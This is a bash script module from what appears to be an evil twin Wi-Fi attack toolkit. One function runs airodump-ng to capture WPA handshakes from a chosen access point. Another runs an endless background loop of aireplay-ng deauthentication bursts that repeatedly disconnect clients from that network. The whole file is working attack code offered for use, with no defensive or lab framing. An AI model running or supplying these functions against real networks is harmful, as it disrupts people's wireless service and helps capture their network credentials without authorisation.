#!/usr/bin/env bash

# Handshake capture functions for evil twin attack

# Start airodump-ng to capture handshakes
start_handshake_capture() {
    local iface=$1
    local target_bssid=$2
    local target_channel=$3
    local output_file=$4
    local pid_file=$5
    
    log "Starting handshake capture on $iface for BSSID: $target_bssid"
    
    # Start airodump-ng in the background
    airodump-ng \
        --band g \
        --channel "$target_channel" \
        --bssid "$target_bssid" \
        --write "$output_file" \
        --output-format cap \
        "$iface" \
        >/dev/null 2>&1 &
    
    echo $! > "$pid_file"
    sleep 2
    
    # Check if airodump started successfully
    if [[ ! -f "$pid_file" ]]; then
        error_exit "Failed to start handshake capture"
    fi
}

# Start deauthentication attacks
start_deauth() {
    local iface=$1
    local target_bssid=$2
    local target_channel=$3
    local delay=${4:-"15"}  # seconds between deauth bursts
    
    log "Starting deauthentication attacks on $target_bssid every $delay seconds"
    
    # Loop to continuously send deauth packets
    while true; do
        log "Sending deauthentication packets to $target_bssid"
        
        # Send 10 deauth packets to broadcast
        aireplay-ng \
            --deauth 10 \
            --channel "$target_channel" \
            -a "$target_bssid" \
            "$iface" \
            >/dev/null 2>&1
        
        # Wait before next round
        sleep "$delay"
    done &
    
    # Store the PID of the deauth loop
    local deauth_pid=$!
    echo $deauth_pid > "$WORKDIR/deauth.pid"
    log "Deauthentication process started (PID: $deauth_pid)"
}